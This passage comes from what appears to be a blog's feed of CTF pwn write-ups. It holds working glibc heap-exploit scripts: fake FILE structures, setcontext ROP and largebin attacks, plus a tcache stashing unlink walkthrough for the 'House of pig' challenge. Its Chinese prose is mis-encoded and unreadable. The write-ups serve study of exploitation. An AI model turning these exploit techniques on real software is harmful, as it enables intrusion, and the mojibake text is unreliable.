class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#fake stderr----------------------------------------</span></span><br><span class="line">fake_stderr = heap_base + <span class="number">0xf70</span></span><br><span class="line">fake_rdx = fake_stderr + <span class="number">0x10</span> + <span class="number">0x200</span></span><br><span class="line">fake_stack = fake_stderr + <span class="number">0x10</span> + <span class="number">0x320</span></span><br><span class="line">io = p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io += p64(<span class="number">1</span>) + p64(<span class="number">2</span>)<span class="comment">#rcx!=0</span></span><br><span class="line">io += p64(fake_rdx)<span class="comment">#backup_base rdx</span></span><br><span class="line">io += p64(setcontext61)</span><br><span class="line">io = io.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(libc_base+<span class="number">0x21ba60</span>)<span class="comment">#lock</span></span><br><span class="line">io = io.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(fake_stderr+<span class="number">0x30</span>)<span class="comment">#wide_data rax1</span></span><br><span class="line">io = io.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(<span class="number">1</span>)<span class="comment">#mode</span></span><br><span class="line">io = io.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io += p64(fake_stderr+<span class="number">0x40</span>)</span><br><span class="line">io = io.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#fake rdx:</span></span><br><span class="line">payload = <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdi-&gt;0</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(fake_stack)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">io += payload</span><br><span class="line">io = io.ljust(<span class="number">0x320</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="comment">#fake_stack:</span></span><br><span class="line">payload = p64(libc_base+libc.sym[<span class="string">&#x27;close&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(fake_rdx)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">io+=payload</span><br><span class="line"></span><br><span class="line">io = io.ljust(<span class="number">0x430</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x440</span>,io)<span class="comment"># largebin 0 </span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x440</span>,cyclic(<span class="number">0x440</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x430</span>,cyclic(<span class="number">0x430</span>))<span class="comment">#largebin 1</span></span><br><span class="line"><span class="comment"># add(7,0x440,cyclic(0x440))</span></span><br><span class="line"><span class="comment"># add(8,0x420,cyclic(0x420))</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x440</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(stderr_addr-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x430</span>, cyclic(<span class="number">0x430</span>))<span class="comment">#calloc chunk6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack 2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)<span class="comment">#largebin 1 0x430</span></span><br><span class="line"><span class="comment">#delete(8)</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(heap_base+<span class="number">0x2538</span>-<span class="number">5</span>-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x41f</span>,cyclic(<span class="number">0x41f</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))<span class="comment">#trigger malloc assert</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">mio~</summary>
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
    <category term="wp" scheme="http://deepunk.icu/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>House of pig xctf2021finalÂ§çÁé∞</title>
    <link href="http://deepunk.icu/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/"/>
    <id>http://deepunk.icu/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-07-27T03:17:56.000Z</published>
    <updated>2023-12-14T15:12:06.947Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Èò¥Èó¥Â†ÜÈ£éÊ∞¥</p></blockquote><h2 id="ÈÄÜÂêë"><a href="#ÈÄÜÂêë" class="headerlink" title="ÈÄÜÂêë"></a>ÈÄÜÂêë</h2><h3 id="‰øÆÂ§çswitch"><a href="#‰øÆÂ§çswitch" class="headerlink" title="‰øÆÂ§çswitch"></a>‰øÆÂ§çswitch</h3><p>0: 0x3985 invalid</p><p>1: 0x3797 add</p><p>2: 0x37B3 show</p><p>3: 0x37cf edit</p><p>4: 0x37eb delet</p><p>5: 0x3807 change role</p><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>ÈÄöËøáaddÂáΩÊï∞ÔºåÁåúÊµãÂá∫heap_listÔºåheap_sizeÁöÑ‰ΩúÁî®ÔºåÁªìÂêàfree„ÄÅeditÂáΩÊï∞ÊâæÂà∞‰∏§‰∏™Ê†áÂøó‰Ωç</p><p>ÁªìÂêàÊØè‰∏™ÁöÑÂ§ßÂ∞è‰∏éÂÅèÁßªÔºåÊé®ÊµãÂá∫Êï∞ÁªÑÁöÑÊï∞Èáè</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">house</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *<span class="built_in">list</span>[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">int</span> size[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">char</span> flag1[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">char</span> flag2[<span class="number">0x18</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tmp_house</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">peppa_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_peppasize;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">mummy_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_mummysize;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">daddy_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_daddysize;</span><br><span class="line">  <span class="type">int</span> show_time;</span><br><span class="line">  <span class="type">int</span> edit_time;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><ol><li>Â°´ÂÖÖ1‰∏™1Âíån‰∏™0,‰Ωø‰ø°ÊÅØÈïøÂ∫¶‰∏∫N*512+448(bit)</li><li>Áî®64bitÂ≠òÂÇ®Â°´ÂÖÖÂâç‰ø°ÊÅØÈïøÂ∫¶ÔºåÂä†Âú®ÂêéÈù¢ÔºåÈïøÂ∫¶Âèò‰∏∫(N+1)*512</li><li>Ë£ÖÂÖ•Ê†áÂáÜÁöÑÂπªÊï∞: A&#x3D;0x67452301, B&#x3D;0xefcdab89, C&#x3D;0x98badcfe, D&#x3D;0x10325476</li><li>ÂõõËΩÆÂæ™ÁéØËøêÁÆóÔºåÂæ™ÁéØÊ¨°Êï∞‰∏∫ÂàÜÁªÑ‰∏™Êï∞(N+1)</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    start = <span class="string">&quot;3c4400&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">            s=<span class="string">&#x27;A&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">            <span class="comment">#s=&#x27;B&#x27;+str(i)</span></span><br><span class="line">            <span class="comment">#s=&#x27;C&#x27;+str(i)</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Test %s &quot;</span> % s</span><br><span class="line">            <span class="keyword">if</span> hashlib.md5(s).hexdigest().startswith(start):</span><br><span class="line">                <span class="built_in">print</span>(s)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">A39275120</span></span><br><span class="line"><span class="string">B3332073</span></span><br><span class="line"><span class="string">C75929410</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Âà©Áî®"><a href="#Âà©Áî®" class="headerlink" title="Âà©Áî®"></a>Âà©Áî®</h3><ul><li>addÂ§ßÂ∞è0x90~0x430ÔºåÂêå‰∏ÄËßíËâ≤sizeÂè™ËÉΩÂ¢ûÂä†</li><li>peppa 20Ê¨°Ôºåmummy 10Ê¨°Ôºådaddy 5Ê¨°</li><li>peppa 0x30i, mummy 0x30i + 0x10, daddy 0x31i + 0x20</li><li>view 2Ê¨°Ôºåedit 8Ê¨°</li><li>deletÂêéÊó†Ê≥ïdeletÔºåÂàáÊç¢ËßíËâ≤ÂèØedit„ÄÅview</li><li>daddyÁöÑadd‰∏çÁî®‰∏ÄÁõ¥Â¢ûÂä†ÔºÅ</li><li>daddy addÊúÄÂêé‰∏ÄÊ¨°Êó∂‰ºöÂ§öcalloc0xe8</li></ul><h2 id="Â†ÜÈ£éÊ∞¥"><a href="#Â†ÜÈ£éÊ∞¥" class="headerlink" title="Â†ÜÈ£éÊ∞¥"></a>Â†ÜÈ£éÊ∞¥</h2><h3 id="roleÁöÑÈÄâÊã©"><a href="#roleÁöÑÈÄâÊã©" class="headerlink" title="roleÁöÑÈÄâÊã©"></a>roleÁöÑÈÄâÊã©</h3><p>Ê≥®ÊÑè‰∏çÂêåroleÁöÑÂ†ÜÂàóË°®ÊòØÁã¨Á´ãÁöÑÔºåÂêåÊó∂‰∏çÂêåroleËÉΩ‰øÆÊîπÁöÑ‰ΩçÁΩÆ‰πü‰∏çÂêå</p><p>peppaÂèØ‰ª•‰øÆÊîπfd,bk</p><p>mummyÂèØ‰ª•‰øÆÊîπfd_nextsize,bk_nextsize</p><p>Âõ†ËÄåÊúÄÂ•ΩpeppaÊâìtcache stashing unlink, mummyÊâìlargebin attack</p><p>ÂΩìÁÑ∂Ëøô‰∏çÊòØÁªùÂØπÁöÑÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáUAFËææÂà∞ÂØπÂêå‰∏Ä‰∏™Â†ÜÂùóÁöÑÊ∑∑Ê∑Ü</p><h3 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache stashing unlink"></a>tcache stashing unlink</h3><p>1.<code>tcache</code>‰∏≠Êîæ<code>5</code>‰∏™Ôºå<code>smallbin</code>‰∏≠Êîæ‰∏§‰∏™</p><p>2.Â∞Ü<strong>ÂêéËøõ</strong><code>smallbin</code>ÁöÑ<code>chunk</code>ÁöÑ<code>bk</code>(‰∏çÁ†¥Âùè<code>fd</code>ÊåáÈíàÁöÑÊÉÖÂÜµ‰∏ã)‰øÆÊîπ‰∏∫<code>[target-0x10]</code>(Âç≥target‰∏∫Â∞ÜË¶ÅÂä†ÂÖ•tchacheÁöÑchunkÁöÑuser pointerÂ§ÑÔºâÔºåÂêåÊó∂Â∞ÜÁõÆÊ†áÂú∞ÂùÄ<code>+0x08</code>Â§ÑÔºàÂç≥target-&gt;bk)ÁöÑÂÄºËÆæÁΩÆ‰∏∫‰∏Ä‰∏™ÊåáÂêëÂèØÂÜôÂÜÖÂ≠òÁöÑÊåáÈíà„ÄÇ</p><p> 3.‰ªésmallbin‰∏≠Âèñ‰∏Ä‰∏™chunkÔºåËµ∞ÂÆåstashÊµÅÁ®ãÔºåÁõÆÊ†áÂú∞ÂùÄÂ∞±‰ºöË¢´ÈìæÂÖ•tcache‰∏≠„ÄÇ</p><h3 id="Â∏ÉÂ±ÄÁöÑÈóÆÈ¢ò"><a href="#Â∏ÉÂ±ÄÁöÑÈóÆÈ¢ò" class="headerlink" title="Â∏ÉÂ±ÄÁöÑÈóÆÈ¢ò"></a>Â∏ÉÂ±ÄÁöÑÈóÆÈ¢ò</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><blockquote><p> Âú®tcache‰∏≠Êîæ‰∫Ü5‰∏™ÁöÑÊÉÖÂÜµ‰∏ãÔºåÂ¶Ç‰Ωï‰Ωø‰∏§‰∏™chunkËøõÂÖ•<strong>Áõ∏ÂêåÂ§ßÂ∞è</strong>ÁöÑsmallbinÔºü</p></blockquote><p>ÈóÆÈ¢òËΩ¨Âåñ‰∏∫ÔºöÂ¶Ç‰Ωï‰Ωø‰∏§‰∏™chunkËøõÂÖ•Áõ∏ÂêåÂ§ßÂ∞èÁöÑunsortedbinÔºåËÄå‰∏çËøõÂÖ•tcache</p><p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230723173130250.png" alt="image-20230723173130250"></p><p>ËÄÉËôëÂΩìunsortedbin‰∏≠Âè™Êúâ‰∏Ä‰∏™chunkÊó∂ÔºåÂàÜÈÖçËæÉÂ∞èÁöÑchunkÊó∂‰ºö‰ªéÂÖ∂‰∏≠Âàá‰∏ÄÂùó‰ΩøÁî®ÔºåÂè¶‰∏ÄÂùóÊîæÂÖ•lastrmainderÔºàÂêåÊ†∑ÊòØunsortedbinÔºâ</p><p>ÊâÄ‰ª•Êàë‰ª¨ÂÖàËé∑Âèñ‰∏Ä‰∏™ËæÉÂ§ßÁöÑunsortedbinÔºåÔºàËøô‰∏ÄÊ≠•ÈÄöËøáÂ°´Êª°tcacheËé∑ÂæóÔºâÔºåÈöèÂêémalloc‰∏ÄÂùóËæÉÂ∞èÁöÑchunk,Â∞±ÂèØ‰ª•Ëé∑ÂæóÁõÆÊ†áÂ§ßÂ∞èÁöÑunsortedbin</p><p>Ê≥®ÊÑèËøôÈáåÊúÄÂêéÈúÄË¶ÅËé∑Âæó‰∏§Âùóunsortedbin,Ê≥®ÊÑèÈÅøÂÖçÂú®ÂàÜÈÖçÁ¨¨‰∫åÂùóÊó∂ÊääÁ¨¨‰∏ÄÂùóÊãøÊéâ„ÄÇÊàë‰∏ÄÂºÄÂßãÂàÜÈÖçÁöÑÂ§ßÂ∞è‰∏∫0x150,ÂàöÂ•ΩÂèØ‰ª•ÊãøÊéâ‰∏Ä‰∏™0xa0Ââ©‰∏ã‰∏Ä‰∏™0xa0,‰ΩÜÊòØÂú®ÂàÜÈÖçÁ¨¨‰∫åÂø´Êó∂Â∞±‰ºöÂá∫Áé∞ÈóÆÈ¢ò</p><p>ÊàëÁöÑËß£ÂÜ≥ÊñπÊ°àÊòØÔºåÂàáÂâ≤0x160ÁöÑÂùóÔºå‰ªé‰∏≠ÂèñÂá∫0xb0ÔºåÂàöÂ•ΩÂâ©‰∏ã0xa0,ÂêåÊó∂Á¨¨‰∫åÊ¨°Âèñ0xb0Êó∂‰∏ç‰ºöÂá∫Áé∞ÊääËé∑ÂæóÁöÑunsortedbinÂèñËµ∞ÁöÑÊÉÖÂÜµ</p><p>ÁΩë‰∏äÁöÑËß£ÂÜ≥ÊñπÊ°àÊòØÔºöÂÜçÂ°´Âè¶‰∏Ä‰∏™tcacheÔºå‰∏§Ê¨°Áî®‰∏çÂêåÁöÑunsortedbinÂàáÂâ≤Ôºå‰ΩÜÊòØËøôÁßçÊñπÊ≥ïÊØîËæÉÊµ™Ë¥πÊ¨°Êï∞</p><p>ÂêåÊó∂ÔºåÁªèËøáËÆ°ÁÆó„ÄÅÂæÆË∞ÉÔºåÊàëËøôÈáåÂàá‰∏ãÊù•ÁöÑsmallbinÁöÑfdÂíåbkÂàöÂ•Ω‰Ωç‰∫échunk1-&gt;7,1-&gt;8ÁöÑÂèØÂÜôÂå∫Âüü</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><blockquote><p>ÊîπÂà∞_IO_list_allÁöÑÊåáÈíàÂêéÔºåÂ¶Ç‰Ωï‰øÆÊîπÂÜÖÂÆπÔºü</p></blockquote><p>Êú¨È¢òÊØîËæÉÈò¥Èó¥ÁöÑÂú∞ÊñπÊòØÔºå‰∏çËÉΩÂÆåÊï¥Âú∞‰øÆÊîπ‰∏Ä‰∏™Â†ÜÂùó</p><p>Â•ΩÂú®Âá∫È¢ò‰∫∫Áªôadd3Âä†‰∫Ü‰∏Ä‰∏™gift,ÂèØ‰ª•Áî≥ËØ∑‰∏Ä‰∏™0xe8ÁöÑÂÆåÊï¥ÂèØÂÜôÁöÑÂ†ÜÂùó</p><p>ÊâÄ‰ª•ÊúÄÂêéÂèØ‰ª•Êäälargebin attackÊåáÂêëÁöÑlargebinÁïôÁùÄÔºåÂÆåÊàêadd3ÁöÑÊúÄÂêé‰∏ÄÊ≠•Ôºå‰ΩøÂæódaddy‰ªéËøô‰∏™largechunk‰∏≠Âàá‰∏ÄÂùóÔºå‰ªéËÄåÁõ¥Êé•Ëé∑ÂæóÂÆåÊï¥ÁöÑ‰øÆÊîπÊùÉÈôê</p><p>‰∏ãÁ≠ñÊòØ‰øÆÊîπlarge chunkÁöÑchainÊåáÈíàÔºå‰ΩøÂÖ∂ÊåáÂêëÂèØÂÜôÂ†ÜÂùó</p><h3 id="Â∏ÉÂ±Ä"><a href="#Â∏ÉÂ±Ä" class="headerlink" title="Â∏ÉÂ±Ä"></a>Â∏ÉÂ±Ä</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pig&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>): <span class="comment">#0xa0-0x430</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;message: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;message: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">role</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> role == <span class="number">1</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;A39275120&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> role == <span class="number">2</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;B3332073&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> role == <span class="number">3</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;C75929410&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache 0xa0</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span 